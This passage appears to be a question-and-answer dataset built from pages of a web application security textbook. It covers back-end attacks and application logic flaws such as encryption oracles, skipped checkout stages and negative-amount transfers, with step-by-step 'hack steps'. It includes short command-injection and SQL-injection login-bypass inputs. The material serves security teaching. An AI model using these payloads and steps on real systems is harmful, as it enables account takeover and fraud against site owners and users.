what type of processing is being performed on your input and\nscrutinize the obstacles that stand in your way.\nFaced with the huge potential attack surface presented by potential attacks\nagainst back-end application components, you may feel that any serious assault\non an application must entail a titanic effort. However, part of learning the art\nof attacking software is to acquire a sixth sense for where the treasure is hid-\nden and how your target is likely to open up so that you can steal it. The only\nway to gain this sense is through practice. You should rehearse the techniques\nwe have described against the real-life applications you encounter and see how\nthey stand up.\ncc1100..iinndddd 440022 88//1199//22001111 1122::1100::5500 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 403\nChapter 10 n Attacking Back-End Components 403\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. A network device provides a web-based interface for performing device\nconfi guration. Why is this kind of functionality often vulnerable to OS\ncommand injection attacks?\n2. You are testing the following URL:\nhttp://wahh-app.com/home/statsmgr.aspx?country=US\nChanging the value of the country parameter to foo results in this error\nmessage:\nCould not open file: D:\\app\\default\\home\\logs\\foo.log (invalid file).\nWhat steps could you take to attack the application?\n3. You are testing an AJAX application that sends data in XML format within\nPOST requests. What kind of vulnerability might enable you to read\narbitrary fi les from the server’s fi lesystem? What prerequisites must be\nin place for your attack to succeed?\n4. You make the following request to an application that is running on the\nASP.NET platform:\nPOST /home.aspx?p=urlparam1&p=urlparam2 HTTP/1.1\nHost: wahh-app.com\nCookie: p=cookieparam\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\np=bodyparam\nThe application executes the following code:\nString param = Request.Params[“p”];\nWhat value does the param variable have?\n5. Is HPP a prerequisite for HPI, or vice versa?\n6. An application contains a function that proxies requests to external domains\nand returns the responses from those requests. To prevent server-side\nredirection attacks from retrieving protected resources on the application’s\nown web server, the application blocks requests targeting localhost or\ncc1100..iinndddd 440033 88//1199//22001111 1122::1100::5500 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 404\n404 Chapter 10 n Attacking Back-End Components\n127.0.0.1. How might you circumvent this defense to access resources\non the server?\n7. An application contains a function for user feedback. This allows the user\nto supply their e-mail address, a message subject, and detailed comments.\nThe application sends an email to feedback@wahh-app.com, addressed\nfrom the user’s email address, with the user-supplied subject line and\ncomments in the message body. Which of the following is a valid defense\nagainst mail injection attacks?\n(a) Disable mail relaying on the mail server.\n(b) Hardcode the RCPT TO fi eld with feedback@wahh-app.com.\n(c) Validate that the user-supplied inputs do not contain any newlines or\nother SMTP metacharacters.\ncc1100..iinndddd 440044 88//1199//22001111 1122::1100::5500 PPMM"
  },
  {
    "input": "Chapter 11 Attacking Application Logic",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 405\nCHAPTER\n11\nAttacking Application Logic\nAll web applications employ logic to deliver their functionality. Writing code\nin a programming language involves at its root nothing more than breaking\na complex process into simple and discrete logical steps. Translating a piece\nof functionality that is meaningful to human beings into a sequence of small\noperations that can be executed by a computer involves a great deal of skill and\ndiscretion. Doing so in an elegant and secure fashion is harder still. When large\nnumbers of different designers and programmers work in parallel on the same\napplication, there is ample opportunity for mistakes to occur.\nIn all but the simplest of web applications, a vast amount of logic is performed\nat every stage. This logic presents an intricate attack surface that is always\npresent but often overlooked. Many code reviews and penetration tests focus\nexclusively on common “headline” vulnerabilities such as SQL injection and\ncross-site scripting, because these have an easily recognizable signature and\nwell-researched exploitation vector. By contrast, fl aws in an application’s logic\nare harder to characterize: each instance may appear to be a unique one-off\noccurrence, and they usually are not identifi ed by any automated vulnerability\nscanners. As a result, they generally are not as well appreciated or understood,\nand therefore they are of great interest to an attacker.\nThis chapter describes the kinds of logic fl aws that often exist in web applica-\ntions and the practical steps you can take to probe and attack an application’s\nlogic. We will present a series of real-world examples, each of which manifests a\ndifferent kind of logical defect. Together, they illustrate the variety of assumptions\n405\ncc1111..iinndddd 440055 88//1199//22001111 1122::1111::4444 PPMM"
  },
  {
    "input": "Real-World Logic Flaws",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 406\n406 Chapter 11 n Attacking Application Logic\nthat designers and developers make that can lead directly to faulty logic and\nexpose an application to security vulnerabilities.\nThe Nature of Logic Flaws\nLogic fl aws in web applications are extremely varied. They range from simple\nbugs manifested in a handful of lines of code, to complex vulnerabilities arising\nfrom the interoperation of several core components of the application. In some\ninstances, they may be obvious and easy to detect; in other cases, they may be\nexceptionally subtle and liable to elude even the most rigorous code review or\npenetration test.\nUnlike other coding fl aws such as SQL injection or cross-site scripting, no\ncommon “signature” is associated with logic fl aws. The defi ning characteristic, of\ncourse, is that the logic implemented within the application is defective in some\nway. In many cases, the defect can be represented in terms of a specifi c assumption\nthat the designer or developer made, either explicitly or implicitly, that turns out\nto be fl awed. In general terms, a programmer may have reasoned something like\n“If A happens, then B must be the case, so I will do C.” The programmer did not\nask the entirely different question “But what if X occurs?” and therefore failed to\nconsider a scenario that violates the assumption. Depending on the circumstances,\nthis fl awed assumption may open a signifi cant security vulnerability.\nAs awareness of common web application vulnerabilities has increased in\nrecent years, the incidence and severity of some categories of vulnerabilities have\ndeclined noticeably. However, because of the nature of logic fl aws, it is unlikely\nthat they will ever be eliminated via standards for secure development, use of\ncode-auditing tools, or normal penetration testing. The diverse nature of logic\nfl aws, and the fact that detecting and preventing them often requires a good\nmeasure of lateral thinking, suggests that they will be prevalent for a good\nwhile to come. Any serious attacker, therefore, needs to pay serious attention\nto the logic employed in the application being targeted to try to fi gure out the\nassumptions that designers and developers probably made. Then he should\nthink imaginatively about how those assumptions may be violated.\nReal-World Logic Flaws\nThe best way to learn about logic fl aws is not by theorizing, but by becoming\nacquainted with some actual examples. Although individual instances of logic\nfl aws differ hugely, they share many common themes, and they demonstrate\nthe kinds of mistakes that human developers will always be prone to making.\ncc1111..iinndddd 440066 88//1199//22001111 1122::1111::4444 PPMM"
  },
  {
    "input": "Example 1: Asking the Oracle",
    "output": "06 Stuttard c11.indd V2 - 07/26/2011 Page 407\nChapter 11 n Attacking Application Logic 407\nHence, insights gathered from studying a sample of logic fl aws should help you\nuncover new fl aws in entirely different situations.\nExample 1: Asking the Oracle\nThe authors have found instances of the “encryption oracle” fl aw within many\ndifferent types of applications. They have used it in numerous attacks, from\ndecrypting domain credentials in printing software to breaking cloud comput-\ning. The following is a classic example of the fl aw found in a software sales site.\nThe Functionality\nThe application implemented a “remember me” function whereby a user could\navoid logging in to the application on each visit by allowing the application to\nset a permanent cookie within the browser. This cookie was protected from\ntampering or disclosure by an encryption algorithm that was run over a string\ncomposed of the name, user ID, and volatile data to ensure that the resultant\nvalue was unique and could not be predicted. To ensure that it could not be\nreplayed by an attacker who gained access to it, data specifi c to the machine\nwas also collected, including the IP address.\nThis cookie was justifi ably considered a robust solution for protecting a\npotentially vulnerable piece of required business functionality.\nAs well as a “remember me” function, the application had functionality to\nstore the user’s screen name within a cookie named ScreenName. That way, the\nuser could receive a personalized greeting in the corner of the site whenever\nshe next visited the site. Deciding that this name was also a piece of security\ninformation, it was deemed that this should also be encrypted.\nThe Assumption\nThe developers decided that because the ScreenName cookie was of considerably\nless value to an attacker than the RememberMe cookie, they may as well use the\nsame encryption algorithm to protect it. What they did not consider was that a\nuser can specify his screen name and view it onscreen. This inadvertently gave\nusers access to the encryption function (and encryption key) used to protect the\npersistent authentication token RememberMe.\nThe Attack\nIn a simple attack, a user supplied the encrypted value of his or her RememberMe\ncookie in place of the encrypted ScreenName cookie. When displaying the screen\nname back to the user, the application would decrypt the value, check that\ncc1111..iinndddd 440077 88//1199//22001111 1122::1111::4444 PPMM\nStuttard c11.indd V2 - 07/26/2011 Page 408\n408 Chapter 11 n Attacking Application Logic\ndecryption had worked, and then print the result on-screen. This resulted in\nthe following message:\nWelcome, marcus|734|192.168.4.282750184\nAlthough this was interesting, it was not necessarily a high-risk issue. It\nsimply meant that given an encrypted RememberMe cookie, an attacker could\nlist the contents, including a username, user ID, and IP address. Because no\npassword was stored in the cookie, there was no immediate way to act on the\ninformation obtained.\nThe real issue arose from the fact that users could specify their screen names.\nAs a result, a user could choose this screen name, for example:\nadmin|1|192.168.4.282750184\nWhen the user logged out and logged back in, the application encrypted this\nvalue and stored it in the user’s browser as the encrypted ScreenName cookie.\nIf an attacker submitted this encrypted token as the value of the RememberMe\ncookie, the application decrypted it, read the user ID, and logged in the attacker\nas the administrator! Even though the encryption was Triple DES, using a strong\nkey and protected against replay attacks, the application could be harnessed as\nan “encryption oracle” to decrypt and encrypt arbitrary values.\nHACK STEPS\nManifestations of this type of vulnerability can be found in diverse locations.\nExamples include account recovery tokens, token-based access to authenti-\ncated resources, and any other value being sent to the client side that needs\nto be either tamper-proof or unreadable to the user.\n1. Look for locations where encryption (not hashing) is used in the applica-\ntion. Determine any locations where the application encrypts or decrypts\nvalues supplied by a user, and attempt to substitute any other encrypted\nvalues encountered within the application. Try to cause an error within\nthe application that reveals the decrypted value or where the decrypted\nvalue is purposely displayed on-screen.\n2. Look for an “oracle reveal” vulnerability by determining where an\nencrypted value can be supplied that results in the correspond-\ning decrypted value’s being displayed in the application’s response.\nDetermine whether this leads to the disclosure of sensitive information,\nsuch as a password or credit card.\n3. Look for an “oracle encrypt” vulnerability by determining where supply-\ning a cleartext value causes the application to return a corresponding\nencrypted value. Determine where this can be abused by specifying arbi-\ntrary values, or malicious payloads that the application will process.\ncc1111..iinndddd 440088 88//1199//22001111 1122::1111::4444 PPMM"
  },
  {
    "input": "Example 2: Fooling a Password Change Function",
    "output": "08 Stuttard c11.indd V2 - 07/26/2011 Page 409\nChapter 11 n Attacking Application Logic 409\nExample 2: Fooling a Password Change Function\nThe authors have encountered this logic fl aw in a web application implemented\nby a fi nancial services company and also in the AOL AIM Enterprise Gateway\napplication.\nThe Functionality\nThe application implemented a password change function for end users. It\nrequired the user to fi ll out fi elds for username, existing password, new pass-\nword, and confi rm new password.\nThere was also a password change function for use by administrators. This\nallowed them to change the password of any user without supplying the existing\npassword. The two functions were implemented within the same server-side\nscript.\nThe Assumption\nThe client-side interface presented to users and administrators differed in one\nrespect: the administrator’s interface did not contain a fi eld for the existing\npassword. When the server-side application processed a password change\nrequest, it used the presence or absence of the existing password parameter to\nindicate whether the request was from an administrator or an ordinary user. In\nother words, it assumed that ordinary users would always supply an existing\npassword parameter.\nThe code responsible looked something like this:\nString existingPassword = request.getParameter(“existingPassword”);\nif (null == existingPassword)\n{\ntrace(“Old password not supplied, must be an administrator”);\nreturn true;\n}\nelse\n{\ntrace(“Verifying user’s old password”);\n...\nThe Attack\nWhen the assumption is explicitly stated in this way, the logic fl aw becomes\nobvious. Of course, an ordinary user could issue a request that did not contain\nan existing password parameter, because users controlled every aspect of the\nrequests they issued.\ncc1111..iinndddd 440099 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 3: Proceeding to Checkout",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 410\n410 Chapter 11 n Attacking Application Logic\nThis logic fl aw was devastating for the application. It enabled an attacker to\nreset the password of any other user and take full control of that person’s account.\nHACK STEPS\n1. When probing key functionality for logic flaws, try removing in turn each\nparameter submitted in requests, including cookies, query string fields,\nand items of POST data.\n2. Be sure to delete the actual name of the parameter as well as its value.\nDo not just submit an empty string, because typically the server handles\nthis differently.\n3. Attack only one parameter at a time to ensure that all relevant code paths\nwithin the application are reached.\n4. If the request you are manipulating is part of a multistage process, follow\nthe process through to completion, because some later logic may process\ndata that was supplied in earlier steps and stored within the session.\nExample 3: Proceeding to Checkout\nThe authors encountered this logic fl aw in the web application employed by\nan online retailer.\nThe Functionality\nThe process of placing an order involved the following stages:\n1. Browse the product catalog, and add items to the shopping basket.\n2. Return to the shopping basket, and fi nalize the order.\n3. Enter payment information.\n4. Enter delivery information.\nThe Assumption\nThe developers assumed that users would always access the stages in the intended\nsequence, because this was the order in which the stages are delivered to the\nuser by the navigational links and forms presented to the user’s browser. Hence,\nany user who completed the ordering process must have submitted satisfactory\npayment details along the way.\nThe Attack\nThe developers’ assumption was fl awed for fairly obvious reasons. Users con-\ntrolled every request they made to the application and therefore could access\ncc1111..iinndddd 441100 88//1199//22001111 1122::1111::4455 PPMM\n10 Stuttard c11.indd V2 - 07/26/2011 Page 411\nChapter 11 n Attacking Application Logic 411\nany stage of the ordering process in any sequence. By proceeding directly from\nstage 2 to stage 4, an attacker could generate an order that was fi nalized for\ndelivery but that had not actually been paid for.\nHACK STEPS\nThe technique for fi nding and exploiting fl aws of this kind is known as forced\nbrowsing. It involves circumventing any controls imposed by in-browser navi-\ngation on the sequence in which application functions may be accessed:\n1. When a multistage process involves a defined sequence of requests,\nattempt to submit these requests out of the expected sequence. Try skip-\nping certain stages, accessing a single stage more than once, and access-\ning earlier stages after later ones.\n2. The sequence of stages may be accessed via a series of GET or POST\nrequests for distinct URLs, or they may involve submitting different sets of\nparameters to the same URL. The stage being requested may be specified\nby submitting a function name or index within a request parameter. Be\nsure to understand fully the mechanisms that the application is employing\nto deliver access to distinct stages.\n3. From the context of the functionality that is implemented, try to under-\nstand what assumptions the developers may have made and where the\nkey attack surface lies. Try to identify ways of violating those assumptions\nto cause undesirable behavior within the application.\n4. When multistage functions are accessed out of sequence, it is common\nto encounter a variety of anomalous conditions within the application,\nsuch as variables with null or uninitialized values, a partially defined or\ninconsistent state, and other unpredictable behavior. In this situation, the\napplication may return an interesting error message and debug output,\nwhich you can use to better understand its internal workings and thereby\nfine-tune the current or a different attack (see Chapter 15). Sometimes,\nthe application may get into a state entirely unanticipated by developers,\nwhich may lead to serious security flaws.\nNOTE Many types of access control vulnerability are similar in nature to this\nlogic fl aw. When a privileged function involves multiple stages that normally\nare accessed in a defi ned sequence, the application may assume that users\nwill always proceed through the functionality in this sequence. The applica-\ntion may enforce strict access control on the initial stages of the process and\nassume that any user who reaches the later stages therefore must be autho-\nrized. If a low-privileged user proceeds directly to a later stage, she may be\nable to access it without any restrictions. See Chapter 8 for more details on\nfi nding and exploiting vulnerabilities of this kind.\ncc1111..iinndddd 441111 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 4: Rolling Your Own Insurance",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 412\n412 Chapter 11 n Attacking Application Logic\nExample 4: Rolling Your Own Insurance\nThe authors encountered this logic fl aw in a web application deployed by a\nfi nancial services company.\nThe Functionality\nThe application enabled users to obtain quotes for insurance and, if desired,\ncomplete and submit an insurance application online. The process was spread\nacross a dozen stages:\nn At the fi rst stage, the applicant submitted some basic information and\nspecifi ed either a preferred monthly premium or the value he wanted\ninsurance for. The application offered a quote, computing whichever\nvalue the applicant did not specify.\nn Across several stages, the applicant supplied various other personal details,\nincluding health, occupation, and pastimes.\nn Finally, the application was transmitted to an underwriter working for\nthe insurance company. Using the same web application, the underwriter\nreviewed the details and decided whether to accept the application as is\nor modify the initial quote to refl ect any additional risks.\nThrough each of the stages described, the application employed a shared com-\nponent to process each parameter of user data submitted to it. This component\nparsed all the data in each POST request into name/value pairs and updated its\nstate information with each item of data received.\nThe Assumption\nThe component that processed user-supplied data assumed that each request\nwould contain only the parameters that had been requested from the user in\nthe relevant HTML form. Developers did not consider what would happen if a\nuser submitted parameters he was not asked to supply.\nThe Attack\nOf course, the assumption was fl awed, because users could submit arbitrary\nparameter names and values with every request. As a result, the application’s\ncore functionality was broken in various ways:\nn An attacker could exploit the shared component to bypass all server-side\ninput validation. At each stage of the quotation process, the application\nperformed strict validation of the data expected at that stage and rejected\nany data that failed this validation. But the shared component updated\ncc1111..iinndddd 441122 88//1199//22001111 1122::1111::4455 PPMM\n12 Stuttard c11.indd V2 - 07/26/2011 Page 413\nChapter 11 n Attacking Application Logic 413\nthe application’s state with every parameter supplied by the user. Hence,\nif an attacker submitted data out of sequence by supplying a name/value\npair that the application expected at an earlier stage, that data would be\naccepted and processed, with no validation having been performed. As it\nhappened, this possibility paved the way for a stored cross-site scripting\nattack targeting the underwriter, which allowed a malicious user to access\nthe personal information of other applicants (see Chapter 12).\nn An attacker could buy insurance at an arbitrary price. At the fi rst stage of\nthe quotation process, the applicant specifi ed either her preferred monthly\npremium or the value she wanted to insure, and the application computed\nthe other item accordingly. However, if a user supplied new values for\neither or both of these items at a later stage, the application’s state was\nupdated with these values. By submitting these parameters out of sequence,\nan attacker could obtain a quote for insurance at an arbitrary value and\narbitrary monthly premium.\nn There were no access controls regarding which parameters a given type of\nuser could supply. When an underwriter reviewed a completed applica-\ntion, he updated various items of data, including the acceptance decision.\nThis data was processed by the shared component in the same way as\ndata supplied by an ordinary user. If an attacker knew or guessed the\nparameter names used when the underwriter reviewed an application, the\nattacker could simply submit these, thereby accepting his own application\nwithout any actual underwriting.\nHACK STEPS\nThe fl aws in this application were fundamental to its security, but none of\nthem would have been identifi ed by an attacker who simply intercepted\nbrowser requests and modifi ed the parameter values being submitted.\n1. Whenever an application implements a key action across multiple stages,\nyou should take parameters that are submitted at one stage of the pro-\ncess and try submitting these to a different stage. If the relevant items of\ndata are updated within the application’s state, you should explore the\nramifications of this behavior to determine whether you can leverage it to\ncarry out any malicious action, as in the preceding three examples.\n2. If the application implements functionality whereby different categories\nof user can update or perform other actions on a common collection\nof data, you should walk through the process using each type of user\nand observe the parameters submitted. Where different parameters are\nordinarily submitted by the different users, take each parameter submit-\nted by one user and try to submit it as the other user. If the parameter\nis accepted and processed as that user, explore the implications of this\nbehavior as previously described.\ncc1111..iinndddd 441133 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 5: Breaking the Bank",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 414\n414 Chapter 11 n Attacking Application Logic\nExample 5: Breaking the Bank\nThe authors encountered this logic fl aw in the web application deployed by a\nmajor fi nancial services company.\nThe Functionality\nThe application enabled existing customers who did not already use the online\napplication to register to do so. New users were required to supply some basic\npersonal information to provide a degree of assurance of their identity. This\ninformation included name, address, and date of birth, but it did not include\nanything secret such as an existing password or PIN.\nWhen this information had been entered correctly, the application forwarded\nthe registration request to back-end systems for processing. An information pack\nwas mailed to the user’s registered home address. This pack included instructions\nfor activating her online access via a telephone call to the company’s call center\nand also a one-time password to use when fi rst logging in to the application.\nThe Assumption\nThe application’s designers believed that this mechanism provided a robust\ndefense against unauthorized access to the application. The mechanism imple-\nmented three layers of protection:\nn A modest amount of personal data was required up front to deter a mali-\ncious attacker or mischievous user from attempting to initiate the registra-\ntion process on other users’ behalf.\nn The process involved transmitting a key secret out-of-band to the cus-\ntomer’s registered home address. An attacker would need to have access\nto the victim’s personal mail.\nn The customer was required to telephone the call center and authenticate\nhimself there in the usual way, based on personal information and selected\ndigits from a PIN.\nThis design was indeed robust. The logic fl aw lay in the implementation of\nthe mechanism.\nThe developers implementing the registration mechanism needed a way to\nstore the personal data submitted by the user and correlate this with a unique\ncustomer identity within the company’s database. Keen to reuse existing code,\nthey came across the following class, which appeared to serve their purposes:\nclass CCustomer\n{\nString firstName;\nString lastName;\ncc1111..iinndddd 441144 88//1199//22001111 1122::1111::4455 PPMM\n14 Stuttard c11.indd V2 - 07/26/2011 Page 415\nChapter 11 n Attacking Application Logic 415\nCDoB dob;\nCAddress homeAddress;\nlong custNumber;\n...\nAfter the user’s information was captured, this object was instantiated, popu-\nlated with the supplied information, and stored in the user’s session. The applica-\ntion then verifi ed the user’s details and, if they were valid, retrieved that user’s\nunique customer number, which was used in all the company’s systems. This\nnumber was added to the object, together with some other useful information\nabout the user. The object was then transmitted to the relevant back-end system\nfor the registration request to be processed.\nThe developers assumed that using this code component was harmless and\nwould not lead to a security problem. However, the assumption was fl awed,\nwith serious consequences.\nThe Attack\nThe same code component that was incorporated into the registration function-\nality was also used elsewhere within the application, including within the core\nfunctionality. This gave authenticated users access to account details, statements,\nfunds transfers, and other information. When a registered user successfully\nauthenticated herself to the application, this same object was instantiated and\nsaved in her session to store key information about her identity. The majority\nof the functionality within the application referenced the information within\nthis object to carry out its actions. For example, the account details presented to\nthe user on her main page were generated on the basis of the unique customer\nnumber contained within this object.\nThe way in which the code component was already being employed within\nthe application meant that the developers’ assumption was fl awed, and the\nmanner in which they reused it did indeed open a signifi cant vulnerability.\nAlthough the vulnerability was serious, it was in fact relatively subtle to\ndetect and exploit. Access to the main application functionality was protected by\naccess controls at several layers, and a user needed to have a fully authenticated\nsession to pass these controls. To exploit the logic fl aw, therefore, an attacker\nneeded to follow these steps:\nn Log in to the application using his own valid account credentials.\nn Using the resulting authenticated session, access the registration function-\nality and submit a different customer’s personal information. This caused\nthe application to overwrite the original CCustomer object in the attacker’s\nsession with a new object relating to the targeted customer.\nn Return to the main application functionality and access the other cus-\ntomer’s account.\ncc1111..iinndddd 441155 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 6: Beating a Business Limit",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 416\n416 Chapter 11 n Attacking Application Logic\nA vulnerability of this kind is not easy to detect when probing the applica-\ntion from a black-box perspective. However, it is also hard to identify when\nreviewing or writing the actual source code. Without a clear understanding of\nthe application as a whole and how different components are used in different\nareas, the fl awed assumption made by developers may not be evident. Of course,\nclearly commented source code and design documentation would reduce the\nlikelihood of such a defect’s being introduced or remaining undetected.\nHACK STEPS\n1. In a complex application involving either horizontal or vertical privilege\nsegregation, try to locate any instances where an individual user can accu-\nmulate an amount of state within his session that relates in some way to\nhis identity.\n2. Try to step through one area of functionality, and then switch to an unre-\nlated area, to determine whether any accumulated state information has\nan effect on the application’s behavior.\nExample 6: Beating a Business Limit\nThe authors encountered this logic fl aw in a web-based enterprise resource\nplanning application used within a manufacturing company.\nThe Functionality\nFinance personnel could perform funds transfers between various bank accounts\nowned by the company and its key customers and suppliers. As a precaution\nagainst fraud, the application prevented most users from processing transfers\nwith a value greater than $10,000. Any transfer larger than this required a senior\nmanager’s approval.\nThe Assumption\nThe code responsible for implementing this check within the application was\nsimple:\nbool CAuthCheck::RequiresApproval(int amount)\n{\nif (amount <= m_apprThreshold)\nreturn false;\nelse return true;\n}\ncc1111..iinndddd 441166 88//1199//22001111 1122::1111::4455 PPMM\n16 Stuttard c11.indd V2 - 07/26/2011 Page 417\nChapter 11 n Attacking Application Logic 417\nThe developers assumed that this transparent check was bulletproof. No\ntransaction for greater than the confi gured threshold could ever escape the\nrequirement for secondary approval.\nThe Attack\nThe developers’ assumption was fl awed because they overlooked the possibility\nthat a user would attempt to process a transfer for a negative amount. Any nega-\ntive number would clear the approval test, because it is less than the threshold.\nHowever, the banking module of the application accepted negative transfers and\nsimply processed them as positive transfers in the opposite direction. Hence,\nany user who wanted to transfer $20,000 from account A to account B could\nsimply initiate a transfer of –$20,000 from account B to account A, which had\nthe same effect and required no approval. The antifraud defenses built into the\napplication could be bypassed easily!\nNOTE Many kinds of web applications employ numeric limits within their\nbusiness logic:\nn A retailing application may prevent a user from ordering more than the\nnumber of units available in stock.\nn A banking application may prevent a user from making bill payments\nthat exceed her current account balance.\nn An insurance application may adjust its quotes based on age thresholds.\nFinding a way to beat such limits often does not represent a security com-\npromise of the application itself. However, it may have serious business con-\nsequences and represent a breach of the controls that the owner is relying on\nthe application to enforce.\nThe most obvious vulnerabilities of this kind often are detected during\nthe user-acceptance testing that normally occurs before an application is\nlaunched. However, more subtle manifestations of the problem may remain,\nparticularly when hidden parameters are being manipulated.\nHACK STEPS\nThe fi rst step in attempting to beat a business limit is to understand what\ncharacters are accepted within the relevant input that you control.\n1. Try entering negative values, and see if the application accepts them and\nprocesses them in the way you would expect.\n2. You may need to perform several steps to engineer a change in the appli-\ncation’s state that can be exploited for a useful purpose. For example,\nseveral transfers between accounts may be required until a suitable bal-\nance has been accrued that can actually be extracted.\ncc1111..iinndddd 441177 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 7: Cheating on Bulk Discounts",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 418\n418 Chapter 11 n Attacking Application Logic\nExample 7: Cheating on Bulk Discounts\nThe authors encountered this logic fl aw in the retail application of a software\nvendor.\nThe Functionality\nThe application allowed users to order software products and qualify for bulk\ndiscounts if a suitable bundle of items was purchased. For example, users who\npurchased an antivirus solution, personal fi rewall, and antispam software were\nentitled to a 25% discount on the individual prices.\nThe Assumption\nWhen a user added an item of software to his shopping basket, the application\nused various rules to determine whether the bundle of purchases he had chosen\nentitled him to a discount. If so, the prices of the relevant items within the shop-\nping basket were adjusted in line with the discount. The developers assumed\nthat the user would go on to purchase the chosen bundle and therefore would\nbe entitled to the discount.\nThe Attack\nThe developers’ assumption is rather obviously fl awed because it ignores the\nfact that users may remove items from their shopping baskets after they have\nbeen added. A crafty user could add to his basket large quantities of every\nsingle product on sale from the vendor to attract the maximum possible bulk\ndiscounts. After the discounts were applied to items in his shopping basket, he\ncould remove items he did not want and still receive the discounts applied to\nthe remaining products.\nHACK STEPS\n1. In any situation where prices or other sensitive values are adjusted based\non criteria that are determined by user-controllable data or actions, first\nunderstand the algorithms that the application uses and the point within\nits logic where adjustments are made. Identify whether these adjustments\nare made on a one-time basis or whether they are revised in response to\nfurther actions performed by the user.\n2. Think imaginatively. Try to find a way of manipulating the application’s\nbehavior to cause it to get into a state where the adjustments it has\napplied do not correspond to the original criteria intended by its design-\ners. In the most obvious case, as just described, this may simply involve\nremoving items from a shopping cart after a discount has been applied!\ncc1111..iinndddd 441188 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 8: Escaping from Escaping",
    "output": "18 Stuttard c11.indd V2 - 07/26/2011 Page 419\nChapter 11 n Attacking Application Logic 419\nExample 8: Escaping from Escaping\nThe authors encountered this logic fl aw in various web applications, including\nthe web administration interface used by a network intrusion detection product.\nThe Functionality\nThe application’s designers had decided to implement some functionality that\ninvolved passing user-controllable input as an argument to an operating system\ncommand. The application’s developers understood the inherent risks involved\nin this kind of operation (see Chapter 9) and decided to defend against these\nrisks by sanitizing any potentially malicious characters within the user input.\nAny instances of the following would be escaped using the backslash character:\n;|&<>‘ space and newline\nEscaping data in this way causes the shell command interpreter to treat the\nrelevant characters as part of the argument being passed to the invoked com-\nmand, rather than as shell metacharacters. Such metacharacters could be used\nto inject additional commands or arguments, redirect output, and so on.\nThe Assumption\nThe developers were certain that they had devised a robust defense against\ncommand injection attacks. They had brainstormed every possible character that\nmight assist an attacker and had ensured that they were all properly escaped\nand therefore made safe.\nThe Attack\nThe developers forgot to escape the escape character itself.\nThe backslash character usually is not of direct use to an attacker when\nexploiting a simple command injection fl aw. Therefore, the developers did not\nidentify it as potentially malicious. However, by failing to escape it, they pro-\nvided a means for the attacker to defeat their sanitizing mechanism.\nSuppose an attacker supplies the following input to the vulnerable function:\nfoo\\;ls\nThe application applies the relevant escaping, as described previously, so the\nattacker’s input becomes:\nfoo\\\\;ls\nWhen this data is passed as an argument to the operating system command,\nthe shell interpreter treats the fi rst backslash as the escape character. Therefore,\nit treats the second backslash as a literal backslash—not as an escape character,\nbut as part of the argument itself. It then encounters a semicolon that is appar-\nently not escaped. It treats this as a command separator and therefore goes on\nto execute the injected command supplied by the attacker.\ncc1111..iinndddd 441199 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 9: Invalidating Input Validation",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 420\n420 Chapter 11 n Attacking Application Logic\nHACK STEPS\nWhenever you probe an application for command injection and other fl aws,\nhaving attempted to insert the relevant metacharacters into the data you con-\ntrol, always try placing a backslash immediately before each such character to\ntest for the logic fl aw just described.\nNOTE This same fl aw can be found in some defenses against cross-site\nscripting attacks (see Chapter 12). When user-supplied input is copied directly\ninto the value of a string variable in a piece of JavaScript, this value is encap-\nsulated within quotation marks. To defend themselves against cross-site\nscripting, many applications use backslashes to escape any quotation marks\nthat appear within the user’s input. However, if the backslash character itself\nis not escaped, an attacker can submit \\’ to break out of the string and there-\nfore take control of the script. This exact bug was found in early versions of\nthe Ruby On Rails framework in the escape_javascript function.\nExample 9: Invalidating Input Validation\nThe authors encountered this logic fl aw in a web application used in an e-com-\nmerce site. Variants can be found in many other applications.\nThe Functionality\nThe application contained a suite of input validation routines to protect against\nvarious types of attacks. Two of these defense mechanisms were a SQL injection\nfi lter and a length limiter.\nIt is common for applications to try to defend themselves against SQL injec-\ntion by escaping any single quotation marks that appear within string-based\nuser input (and rejecting any that appear within numeric input). As described\nin Chapter 9, two single quotation marks together are an escape sequence that\nrepresents one literal single quote, which the database interprets as data within a\nquoted string rather than the closing string terminator. Many developers reason,\ntherefore, that by doubling any single quotation marks within user-supplied\ninput, they will prevent any SQL injection attacks from occurring.\nThe length limiter was applied to all input, ensuring that no variable sup-\nplied by a user was longer than 128 characters. It achieved this by truncating\nany variables to 128 characters.\nThe Assumption\nIt was assumed that both the SQL injection fi lter and length truncation were\ndesirable defenses from a security standpoint, so both should be applied.\ncc1111..iinndddd 442200 88//1199//22001111 1122::1111::4455 PPMM\n20 Stuttard c11.indd V2 - 07/26/2011 Page 421\nChapter 11 n Attacking Application Logic 421\nThe Attack\nThe SQL injection defense works by doubling any quotation marks appearing\nwithin user input, so that within each pair of quotes, the fi rst quote acts as an\nescape character to the second. However, the developers did not consider what\nwould happen to the sanitized input if it was then handed to the truncation\nfunction.\nRecall the SQL injection example in a login function in Chapter 9. Suppose\nthat the application doubles any single quotation marks contained in user input\nand also then imposes a length limit on the data, truncating it to 128 characters.\nSupplying this username:\nadmin’--\nnow results in the following query, which fails to bypass the login:\nSELECT * FROM users WHERE username = ‘admin’’--’ and password = ‘’\nHowever, if you submit a following username (containing 127 a’s followed\nby a single quotation mark):\naaaaaaaa[...]aaaaaaaaaaa’\nthe application fi rst doubles up the single quotation mark and then truncates the\nstring to 128 characters, returning your input to its original value. This results\nin a database error, because you have injected an additional single quotation\nmark into the query without fi xing the surrounding syntax. If you now also\nsupply the password:\nor 1=1--\nthe application performs the following query, which succeeds in bypassing the\nlogin:\nSELECT * FROM users WHERE username = 